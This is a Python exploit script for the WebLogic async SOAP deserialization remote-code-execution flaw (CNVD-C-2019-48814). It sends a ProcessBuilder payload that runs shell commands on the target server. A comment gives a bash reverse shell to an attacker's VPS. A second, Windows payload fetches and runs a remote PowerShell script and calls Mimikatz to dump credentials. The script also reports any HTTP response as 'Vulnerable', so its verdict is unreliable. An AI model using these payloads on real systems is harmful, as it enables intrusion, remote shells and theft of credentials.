#coding:utf-8

import requests
requests.packages.urllib3.disable_warnings()

def run(url):
    vul_url = url + ':7001/_async/AsyncResponseService'
    header={'content-type':'text/xml'}
    # 反弹shell:  <string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>
    payload = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
    <soapenv:Header> 
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>id > /tmp/b4</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>"""

    win_payload = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
    <soapenv:Header> 
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>cmd</string>
    </void>
    <void index="1">
    <string>/c</string>
    </void>
    <void index="2">
    <string>powershell "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds"</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    """
    req = requests.post(url=vul_url, headers=header, data=payload, timeout=3)
    if req.status_code:
        return 'Weblogic async rce CNVD-C-2019-48814 Vulnerable'


if __name__ == '__main__':
    run('http://192.168.127.128')
